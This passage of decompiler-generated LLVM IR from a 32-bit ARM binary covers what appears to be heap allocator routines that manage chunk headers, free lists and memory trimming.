  %v1_10cc0 = add i32 %v0_10cc0, 8
  store i32 %v1_10cc0, i32* @r0, align 4
  %v0_10cc4 = call i32 @function_11048()
  store i32 %v0_10cc4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cc8

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10c78, %dec_label_pc_10c98
  %v0_10cc8 = load i32, i32* @sl, align 4
  %v1_10cc8 = add i32 %v0_10cc8, 8
  store i32 %v1_10cc8, i32* @r4, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10cd0:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10cd8 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10cd8, i32* @r8, align 4
  %v2_10cdc = inttoptr i32 %v1_10aec to i32*
  %v3_10cdc = load i32, i32* %v2_10cdc, align 4
  store i32 %v3_10cdc, i32* @r4, align 4
  %v1_10ce0 = add i32 %v4_10cd8, 860
  %v2_10ce0 = inttoptr i32 %v1_10ce0 to i32*
  %v3_10ce0 = load i32, i32* %v2_10ce0, align 4
  %v1_10ce4 = add i32 %v3_10cdc, 4
  %v1_10ce8 = add i32 %v3_10ce0, -1
  store i32 %v1_10ce8, i32* %r2.global-to-local, align 4
  %v2_10cec = add i32 %v1_10ce4, %v1_10ce8
  %v1_10cf0 = load i32, i32* @sb, align 4
  %v2_10cf0 = add i32 %v2_10cec, %v1_10cf0
  store i32 %v2_10cf0, i32* %r3.global-to-local, align 4
  %v2_10cf4 = sub i32 0, %v3_10ce0
  %v3_10cf4 = and i32 %v2_10cf0, %v2_10cf4
  store i32 %v3_10cf4, i32* @r7, align 4
  %v2_10cf8 = sub i32 %v3_10cf4, %v3_10cdc
  store i32 %v2_10cf8, i32* @fp, align 4
  %v9_10cfc = icmp eq i32 %v1_10af0, %v2_10cf8
  br i1 %v9_10cfc, label %dec_label_pc_10d70, label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10cd0
  %v2_10d04 = sub i32 %v1_10aec, %v3_10cdc
  store i32 %v2_10d04, i32* %r0.global-to-local, align 4
  %v2_10d08 = add i32 %v3_10cdc, %v1_10af0
  store i32 %v2_10d08, i32* %r1.global-to-local, align 4
  store i32 %v3_10cf4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_10d14 = call i32 @function_12e4c(i32 %v2_10d04, i32 %v2_10d08, i32 %v3_10cf4, i32 1)
  store i32 %v4_10d14, i32* %r0.global-to-local, align 4
  %v7_10d18 = icmp eq i32 %v4_10d14, -1
  br i1 %v7_10d18, label %dec_label_pc_10d64, label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d04
  %v1_10d20 = load i32, i32* @r4, align 4
  %v2_10d20 = add i32 %v1_10d20, %v4_10d14
  store i32 %v2_10d20, i32* %r0.global-to-local, align 4
  %v0_10d24 = load i32, i32* @fp, align 4
  %v1_10d24 = or i32 %v0_10d24, 2
  store i32 %v1_10d24, i32* %r3.global-to-local, align 4
  %v2_10d28 = add i32 %v2_10d20, 4
  %v3_10d28 = inttoptr i32 %v2_10d28 to i32*
  store i32 %v1_10d24, i32* %v3_10d28, align 4
  %v0_10d2c = load i32, i32* @r8, align 4
  %v1_10d2c = add i32 %v0_10d2c, 868
  %v2_10d2c = inttoptr i32 %v1_10d2c to i32*
  %v3_10d2c = load i32, i32* %v2_10d2c, align 4
  store i32 %v3_10d2c, i32* %r3.global-to-local, align 4
  %v1_10d30 = add i32 %v0_10d2c, 880
  %v2_10d30 = inttoptr i32 %v1_10d30 to i32*
  %v3_10d30 = load i32, i32* %v2_10d30, align 4
  store i32 %v3_10d30, i32* %r2.global-to-local, align 4
  %v0_10d34 = load i32, i32* @r6, align 4
  %v2_10d34 = sub i32 %v3_10d2c, %v0_10d34
  store i32 %v2_10d34, i32* %r3.global-to-local, align 4
  %v1_10d38 = load i32, i32* @r7, align 4
  %v2_10d38 = add i32 %v1_10d38, %v2_10d34
  store i32 %v2_10d38, i32* %r1.global-to-local, align 4
  %v1_10d3c = add i32 %v0_10d2c, 872
  %v2_10d3c = inttoptr i32 %v1_10d3c to i32*
  %v3_10d3c = load i32, i32* %v2_10d3c, align 4
  store i32 %v3_10d3c, i32* %r3.global-to-local, align 4
  %v1_10d44 = add i32 %v0_10d2c, 884
  %v2_10d44 = inttoptr i32 %v1_10d44 to i32*
  %v3_10d44 = load i32, i32* %v2_10d44, align 4
  store i32 %v3_10d44, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_10d38, %v3_10d30
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_10d20
  store i32 %v2_10d38, i32* %v2_10d30, align 4
  %v0_10d4c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10d4c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_10d20, %bb33
  %v1_10d4c = phi i32 [ %v0_10d2c, %dec_label_pc_10d20 ], [ %v1_10d4c.pre, %bb33 ]
  %v0_10d4c = phi i32 [ %v2_10d38, %dec_label_pc_10d20 ], [ %v0_10d4c.pre, %bb33 ]
  %v2_10d4c = add i32 %v1_10d4c, 868
  %v3_10d4c = inttoptr i32 %v2_10d4c to i32*
  store i32 %v0_10d4c, i32* %v3_10d4c, align 4
  %v0_10d50 = load i32, i32* %r1.global-to-local, align 4
  %v1_10d50 = load i32, i32* %r3.global-to-local, align 4
  %v2_10d50 = add i32 %v1_10d50, %v0_10d50
  store i32 %v2_10d50, i32* %r1.global-to-local, align 4
  %v1_10d54 = load i32, i32* %r2.global-to-local, align 4
  %v0_10d58 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d58 = add i32 %v0_10d58, 8
  store i32 %v1_10d58, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_10d50, %v1_10d54
  br i1 %tmp43, label %bb35, label %dec_label_pc_10d9c

bb35:                                             ; preds = %bb34
  %v5_10d5c = load i32, i32* @r8, align 4
  %v6_10d5c = add i32 %v5_10d5c, 884
  %v7_10d5c = inttoptr i32 %v6_10d5c to i32*
  store i32 %v2_10d50, i32* %v7_10d5c, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d04
  %v0_10d64 = load i32, i32* @sb, align 4
  %v1_10d64 = add i32 %v0_10d64, 4
  store i32 %v1_10d64, i32* %r3.global-to-local, align 4
  %v0_10d68 = load i32, i32* @r6, align 4
  %v3_10d68 = icmp ult i32 %v0_10d68, %v1_10d64
  br i1 %v3_10d68, label %dec_label_pc_10d78, label %dec_label_pc_10d64.dec_label_pc_10d70_crit_edge

dec_label_pc_10d64.dec_label_pc_10d70_crit_edge:  ; preds = %dec_label_pc_10d64
  %v0_10d70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10d64.dec_label_pc_10d70_crit_edge, %dec_label_pc_10cd0
  %v0_10d70 = phi i32 [ %v0_10d70.pre, %dec_label_pc_10d64.dec_label_pc_10d70_crit_edge ], [ %v0_10ad8, %dec_label_pc_10cd0 ]
  store i32 %v0_10d70, i32* @r4, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d64
  %v1_10d78 = add i32 %v0_10d64, -7
  store i32 %v1_10d78, i32* %r0.global-to-local, align 4
  %v1_10d7c = call i32 @function_10110(i32 %v1_10d78)
  store i32 %v1_10d7c, i32* @r0, align 4
  store i32 %v1_10d7c, i32* @r4, align 4
  %v2_10d80 = icmp eq i32 %v1_10d7c, 0
  br i1 %v2_10d80, label %dec_label_pc_10d9c, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d78
  %v0_10d88 = load i32, i32* @r6, align 4
  %v1_10d88 = add i32 %v0_10d88, -8
  store i32 %v1_10d88, i32* @r2, align 4
  %v0_10d8c = load i32, i32* @r5, align 4
  store i32 %v0_10d8c, i32* @r1, align 4
  %v0_10d90 = call i32 @function_f700()
  %v0_10d94 = load i32, i32* @r5, align 4
  store i32 %v0_10d94, i32* @r0, align 4
  %v0_10d98 = call i32 @function_11048()
  store i32 %v0_10d98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_10d78, %dec_label_pc_10d70, %dec_label_pc_10cc8, %.thread6, %dec_label_pc_10b38, %dec_label_pc_10d88
  store i32 %v2_10a8c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v4_10dac = load i32, i32* inttoptr (i32 142988 to i32*), align 4
  store i32 %v4_10dac, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_10dac)
  br label %dec_label_pc_10db8

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10ac0, %dec_label_pc_10a68, %dec_label_pc_10a50, %dec_label_pc_10d9c
  %v0_10db8 = load i32, i32* @r4, align 4
  store i32 %v0_10db8, i32* %r0.global-to-local, align 4
  store i32 %v3_10a30, i32* @r4, align 4
  store i32 %v6_10a30, i32* @r5, align 4
  store i32 %v9_10a30, i32* @r6, align 4
  store i32 %v12_10a30, i32* @r7, align 4
  store i32 %v15_10a30, i32* @r8, align 4
  store i32 %v18_10a30, i32* @sb, align 4
  store i32 %v21_10a30, i32* @sl, align 4
  store i32 %v24_10a30, i32* @fp, align 4
  store i32 %v27_10a30, i32* @lr, align 4
  ret i32 %v0_10db8

; uselistorder directives
  uselistorder i32 %v2_10d50, { 1, 0, 2 }
  uselistorder i32 %v2_10d38, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10d14, { 1, 0, 2 }
  uselistorder i32 %v3_10cf4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10c98, { 2, 1, 0 }
  uselistorder i32 %v2_10c68, { 1, 0, 2 }
  uselistorder i32 %v0_10bfc, { 1, 0 }
  uselistorder i32 %v1_10bb8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_10b1c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10b14, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_10af8, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_10af0, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_10aec, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_10adc, { 1, 0 }
  uselistorder i32 %v0_10ad8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_10ab8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 22, 12, 14, 13, 15, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32* inttoptr (i32 142988 to i32*), { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10db8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10d9c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_10cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10c68, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10bb4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10ba4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_10dcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_10dcc:
  %v0_10dcc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10dcc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10dcc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10dcc, %bb
  %v10_10de0 = phi i32 [ %arg1, %dec_label_pc_10dcc ], [ 0, %bb ]
  ret i32 %v10_10de0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10de4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10de4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_10de4 = add i32 %arg2, 44
  %v2_10de4 = inttoptr i32 %v1_10de4 to i32*
  %v3_10de4 = load i32, i32* %v2_10de4, align 4
  %v1_10dec = add i32 %v3_10de4, 4
  %v2_10dec = inttoptr i32 %v1_10dec to i32*
  %v3_10dec = load i32, i32* %v2_10dec, align 4
  %v1_10df0 = add i32 %arg2, 860
  %v2_10df0 = inttoptr i32 %v1_10df0 to i32*
  %v3_10df0 = load i32, i32* %v2_10df0, align 4
  store i32 %v3_10df0, i32* @r4, align 4
  %v1_10df4 = and i32 %v3_10dec, -4
  store i32 %v1_10df4, i32* @r6, align 4
  %v1_10df8 = add i32 %v1_10df4, -17
  %v2_10dfc = add i32 %v1_10df8, %v3_10df0
  store i32 %arg2, i32* @r5, align 4
  %v2_10e08 = sub i32 %v2_10dfc, %arg1
  store i32 %v2_10e08, i32* @r0, align 4
  store i32 %v3_10df0, i32* @r1, align 4
  %v0_10e10 = call i32 @function_cb30()
  %v1_10e14 = add i32 %v0_10e10, -1
  store i32 %v1_10e14, i32* %r0.global-to-local, align 4
  %v0_10e18 = load i32, i32* @r4, align 4
  %v2_10e18 = mul i32 %v0_10e18, %v1_10e14
  store i32 %v2_10e18, i32* %r7.global-to-local, align 4
  %v2_10e1c = icmp eq i32 %v2_10e18, 0
  store i1 %v2_10e1c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_10e18, 1
  br i1 %tmp8, label %dec_label_pc_10e84, label %dec_label_pc_10e24

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10de4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10e28 = call i32 @function_12c60(i32 0)
  store i32 %v1_10e28, i32* %r0.global-to-local, align 4
  %v0_10e2c = load i32, i32* @r5, align 4
  %v1_10e2c = add i32 %v0_10e2c, 44
  %v2_10e2c = inttoptr i32 %v1_10e2c to i32*
  %v3_10e2c = load i32, i32* %v2_10e2c, align 4
  %v0_10e30 = load i32, i32* @r6, align 4
  %v2_10e30 = add i32 %v0_10e30, %v3_10e2c
  %v9_10e34 = icmp eq i32 %v1_10e28, %v2_10e30
  store i1 %v9_10e34, i1* @cpsr_z, align 1
  store i32 %v1_10e28, i32* @r4, align 4
  br i1 %v9_10e34, label %dec_label_pc_10e40, label %dec_label_pc_10e84

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e24
  %v0_10e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_10e40 = sub i32 0, %v0_10e40
  store i32 %v1_10e40, i32* %r0.global-to-local, align 4
  %v1_10e44 = call i32 @function_12c60(i32 %v1_10e40)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10e4c = call i32 @function_12c60(i32 0)
  store i32 %v1_10e4c, i32* %r0.global-to-local, align 4
  %v7_10e50 = icmp eq i32 %v1_10e4c, -1
  store i1 %v7_10e50, i1* @cpsr_z, align 1
  br i1 %v7_10e50, label %dec_label_pc_10e84, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e40
  %v0_10e58 = load i32, i32* @r4, align 4
  %v2_10e58 = sub i32 %v0_10e58, %v1_10e4c
  store i32 %v2_10e58, i32* %r0.global-to-local, align 4
  %v9_10e58 = icmp eq i32 %v0_10e58, %v1_10e4c
  store i1 %v9_10e58, i1* @cpsr_z, align 1
  br i1 %v9_10e58, label %dec_label_pc_10e84, label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e58
  %v0_10e60 = load i32, i32* @r5, align 4
  %v1_10e60 = add i32 %v0_10e60, 872
  %v2_10e60 = inttoptr i32 %v1_10e60 to i32*
  %v3_10e60 = load i32, i32* %v2_10e60, align 4
  %v1_10e64 = load i32, i32* @r6, align 4
  %v2_10e64 = sub i32 %v1_10e64, %v2_10e58
  store i32 %v2_10e64, i32* %r2.global-to-local, align 4
  %v1_10e68 = add i32 %v0_10e60, 44
  %v2_10e68 = inttoptr i32 %v1_10e68 to i32*
  %v3_10e68 = load i32, i32* %v2_10e68, align 4
  store i32 %v3_10e68, i32* %r1.global-to-local, align 4
  %v2_10e6c = sub i32 %v3_10e60, %v2_10e58
  %v1_10e70 = or i32 %v2_10e64, 1
  store i32 %v1_10e70, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10e6c, i32* %v2_10e60, align 4
  %v0_10e7c = load i32, i32* %r2.global-to-local, align 4
  %v1_10e7c = load i32, i32* %r1.global-to-local, align 4
  %v2_10e7c = add i32 %v1_10e7c, 4
  %v3_10e7c = inttoptr i32 %v2_10e7c to i32*
  store i32 %v0_10e7c, i32* %v3_10e7c, align 4
  %v1_10e90.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e88

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e24, %dec_label_pc_10e58, %dec_label_pc_10e40, %dec_label_pc_10de4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e88

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10e60, %dec_label_pc_10e84
  %v1_10e90 = phi i32 [ %v1_10e90.pre, %dec_label_pc_10e60 ], [ 0, %dec_label_pc_10e84 ]
  ret i32 %v1_10e90

; uselistorder directives
  uselistorder i1 %v7_10e50, { 1, 0 }
  uselistorder i32 %v1_10e4c, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_12c60, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10e88, { 1, 0 }
  uselistorder label %dec_label_pc_10e84, { 1, 2, 0, 3 }
}

define i32 @function_10e94() local_unnamed_addr {
dec_label_pc_10e94:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e94 = load i32, i32* @r4, align 4
  store i32 %v3_10e94, i32* %stack_var_-36, align 4
  %v0_10e98 = load i32, i32* @r0, align 4
  %v1_10e98 = inttoptr i32 %v0_10e98 to i32*
  %v2_10e98 = load i32, i32* %v1_10e98, align 4
  store i32 %v2_10e98, i32* %r3.global-to-local, align 4
  %v2_10e9c = icmp eq i32 %v2_10e98, 0
  store i32 %v0_10e98, i32* @r4, align 4
  br i1 %v2_10e9c, label %dec_label_pc_10fd4.preheader, label %dec_label_pc_10eb0

dec_label_pc_10fd4.preheader:                     ; preds = %dec_label_pc_10e94
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_10fdc25 = add i32 %v0_10e98, 52
  store i32 %v1_10fdc25, i32* %r3.global-to-local, align 4
  %v2_10fe426 = add i32 %v0_10e98, 60
  %v3_10fe427 = inttoptr i32 %v2_10fe426 to i32*
  store i32 %v1_10fdc25, i32* %v3_10fe427, align 4
  %v0_10fe828 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fe829 = add i32 %v0_10fe828, 12
  %v3_10fe830 = inttoptr i32 %v2_10fe829 to i32*
  store i32 %v0_10fe828, i32* %v3_10fe830, align 4
  br label %dec_label_pc_10fd4.dec_label_pc_10fd4_crit_edge

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10e94
  %v1_10eb0 = and i32 %v2_10e98, -3
  %v3_10eb4 = udiv i32 %v2_10e98, 8
  store i32 %v3_10eb4, i32* %r2.global-to-local, align 4
  store i32 %v1_10eb0, i32* %v1_10e98, align 4
  %v0_10ebc = load i32, i32* @r0, align 4
  %v1_10ebc = add i32 %v0_10ebc, -4
  store i32 %v1_10ebc, i32* %r3.global-to-local, align 4
  %v1_10ec0 = load i32, i32* %r2.global-to-local, align 4
  %v4_10ec0 = mul i32 %v1_10ec0, 4
  %v5_10ec0 = add i32 %v4_10ec0, %v1_10ebc
  store i32 %v5_10ec0, i32* %sb.global-to-local, align 4
  %v1_10ec4 = add i32 %v0_10ebc, 52
  store i32 %v1_10ec4, i32* %r7.global-to-local, align 4
  %v1_10ec8 = add i32 %v0_10ebc, 4
  store i32 %v1_10ec8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10ed0

dec_label_pc_10ed0:                               ; preds = %dec_label_pc_10fcc, %dec_label_pc_10eb0
  %v1_10fc410 = phi i32 [ %v1_10fc4, %dec_label_pc_10fcc ], [ %v5_10ec0, %dec_label_pc_10eb0 ]
  %v1_10edc = phi i32 [ %v1_10fcc, %dec_label_pc_10fcc ], [ %v1_10ec8, %dec_label_pc_10eb0 ]
  %v1_10ed0 = inttoptr i32 %v1_10edc to i32*
  %v2_10ed0 = load i32, i32* %v1_10ed0, align 4
  store i32 %v2_10ed0, i32* %r1.global-to-local, align 4
  %v2_10ed4 = icmp eq i32 %v2_10ed0, 0
  br i1 %v2_10ed4, label %dec_label_pc_10fc4, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ed0
  %v0_10edc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_10edc, i32* %v1_10ed0, align 4
  %v0_10ee0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10fb8, %dec_label_pc_10edc
  %v0_10efc = phi i32 [ %v0_10fb8, %dec_label_pc_10fb8 ], [ %v0_10ee0.pre, %dec_label_pc_10edc ]
  %v1_10ee0 = add i32 %v0_10efc, 4
  %v2_10ee0 = inttoptr i32 %v1_10ee0 to i32*
  %v3_10ee0 = load i32, i32* %v2_10ee0, align 4
  store i32 %v3_10ee0, i32* %r3.global-to-local, align 4
  %v1_10ee4 = and i32 %v3_10ee0, -2
  store i32 %v1_10ee4, i32* %lr.global-to-local, align 4
  %v2_10ee8 = add i32 %v1_10ee4, %v0_10efc
  store i32 %v2_10ee8, i32* @r0, align 4
  %v1_10eec = urem i32 %v3_10ee0, 2
  %v2_10eec = icmp eq i32 %v1_10eec, 0
  %v1_10ef0 = add i32 %v0_10efc, 8
  %v2_10ef0 = inttoptr i32 %v1_10ef0 to i32*
  %v3_10ef0 = load i32, i32* %v2_10ef0, align 4
  store i32 %v3_10ef0, i32* %sl.global-to-local, align 4
  %v1_10ef4 = add i32 %v2_10ee8, 4
  %v2_10ef4 = inttoptr i32 %v1_10ef4 to i32*
  %v3_10ef4 = load i32, i32* %v2_10ef4, align 4
  store i32 %v3_10ef4, i32* %r8.global-to-local, align 4
  br i1 %v2_10eec, label %dec_label_pc_10efc, label %dec_label_pc_10f30

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10ee0
  %v1_10efc = inttoptr i32 %v0_10efc to i32*
  %v2_10efc = load i32, i32* %v1_10efc, align 4
  store i32 %v2_10efc, i32* %r5.global-to-local, align 4
  %v2_10f00 = sub i32 %v0_10efc, %v2_10efc
  store i32 %v2_10f00, i32* %r3.global-to-local, align 4
  %v1_10f04 = add i32 %v2_10f00, 8
  %v2_10f04 = inttoptr i32 %v1_10f04 to i32*
  %v3_10f04 = load i32, i32* %v2_10f04, align 4
  store i32 %v3_10f04, i32* @ip, align 4
  %v1_10f08 = add i32 %v3_10f04, 12
  %v2_10f08 = inttoptr i32 %v1_10f08 to i32*
  %v3_10f08 = load i32, i32* %v2_10f08, align 4
  store i32 %v3_10f08, i32* %r1.global-to-local, align 4
  %v9_10f0c = icmp eq i32 %v3_10f08, %v2_10f00
  %v1_10f10 = add i32 %v2_10f00, 12
  %v2_10f10 = inttoptr i32 %v1_10f10 to i32*
  %v3_10f10 = load i32, i32* %v2_10f10, align 4
  store i32 %v3_10f10, i32* %r2.global-to-local, align 4
  br i1 %v9_10f0c, label %dec_label_pc_10f18, label %dec_label_pc_10f74

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10efc
  %v1_10f18 = add i32 %v3_10f10, 8
  %v2_10f18 = inttoptr i32 %v1_10f18 to i32*
  %v3_10f18 = load i32, i32* %v2_10f18, align 4
  store i32 %v3_10f18, i32* %r3.global-to-local, align 4
  %v9_10f1c = icmp eq i32 %v3_10f18, %v2_10f00
  br i1 %v9_10f1c, label %dec_label_pc_10f24, label %dec_label_pc_10f74

dec_label_pc_10f24:                               ; preds = %dec_label_pc_10f18
  store i32 %v3_10f04, i32* %v2_10f18, align 4
  %v0_10f28 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f28 = load i32, i32* @ip, align 4
  %v2_10f28 = add i32 %v1_10f28, 12
  %v3_10f28 = inttoptr i32 %v2_10f28 to i32*
  store i32 %v0_10f28, i32* %v3_10f28, align 4
  %v0_10f2c = load i32, i32* %lr.global-to-local, align 4
  %v1_10f2c = load i32, i32* %r5.global-to-local, align 4
  %v2_10f2c = add i32 %v1_10f2c, %v0_10f2c
  store i32 %v2_10f2c, i32* %lr.global-to-local, align 4
  %v0_10f34.pre = load i32, i32* @r0, align 4
  %v0_10f38.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10ee0, %dec_label_pc_10f24
  %v0_10fa8 = phi i32 [ %v1_10ee4, %dec_label_pc_10ee0 ], [ %v2_10f2c, %dec_label_pc_10f24 ]
  %v0_10f38 = phi i32 [ %v3_10ef4, %dec_label_pc_10ee0 ], [ %v0_10f38.pre, %dec_label_pc_10f24 ]
  %v1_10f4c = phi i32 [ %v2_10ee8, %dec_label_pc_10ee0 ], [ %v0_10f34.pre, %dec_label_pc_10f24 ]
  %v0_10f30 = load i32, i32* @r4, align 4
  %v1_10f30 = add i32 %v0_10f30, 44
  %v2_10f30 = inttoptr i32 %v1_10f30 to i32*
  %v3_10f30 = load i32, i32* %v2_10f30, align 4
  store i32 %v3_10f30, i32* %r3.global-to-local, align 4
  %v9_10f34 = icmp eq i32 %v1_10f4c, %v3_10f30
  %v1_10f38 = and i32 %v0_10f38, -4
  store i32 %v1_10f38, i32* %r5.global-to-local, align 4
  br i1 %v9_10f34, label %dec_label_pc_10fa8, label %dec_label_pc_10f40

dec_label_pc_10f40:                               ; preds = %dec_label_pc_10f30
  %v2_10f40 = add i32 %v1_10f4c, %v1_10f38
  store i32 %v2_10f40, i32* %r3.global-to-local, align 4
  %v1_10f44 = add i32 %v2_10f40, 4
  %v2_10f44 = inttoptr i32 %v1_10f44 to i32*
  %v3_10f44 = load i32, i32* %v2_10f44, align 4
  store i32 %v3_10f44, i32* %r3.global-to-local, align 4
  %v1_10f48 = urem i32 %v3_10f44, 2
  %v2_10f48 = icmp eq i32 %v1_10f48, 0
  %v2_10f4c = add i32 %v1_10f4c, 4
  %v3_10f4c = inttoptr i32 %v2_10f4c to i32*
  store i32 %v1_10f38, i32* %v3_10f4c, align 4
  br i1 %v2_10f48, label %dec_label_pc_10f54, label %dec_label_pc_10f40.dec_label_pc_10f84_crit_edge

dec_label_pc_10f40.dec_label_pc_10f84_crit_edge:  ; preds = %dec_label_pc_10f40
  %v0_10f88.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10f84

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f40
  %v0_10f54 = load i32, i32* @r0, align 4
  %v1_10f54 = add i32 %v0_10f54, 8
  %v2_10f54 = inttoptr i32 %v1_10f54 to i32*
  %v3_10f54 = load i32, i32* %v2_10f54, align 4
  store i32 %v3_10f54, i32* @ip, align 4
  %v1_10f58 = add i32 %v3_10f54, 12
  %v2_10f58 = inttoptr i32 %v1_10f58 to i32*
  %v3_10f58 = load i32, i32* %v2_10f58, align 4
  store i32 %v3_10f58, i32* %r3.global-to-local, align 4
  %v9_10f5c = icmp eq i32 %v3_10f58, %v0_10f54
  %v1_10f60 = add i32 %v0_10f54, 12
  %v2_10f60 = inttoptr i32 %v1_10f60 to i32*
  %v3_10f60 = load i32, i32* %v2_10f60, align 4
  store i32 %v3_10f60, i32* %r2.global-to-local, align 4
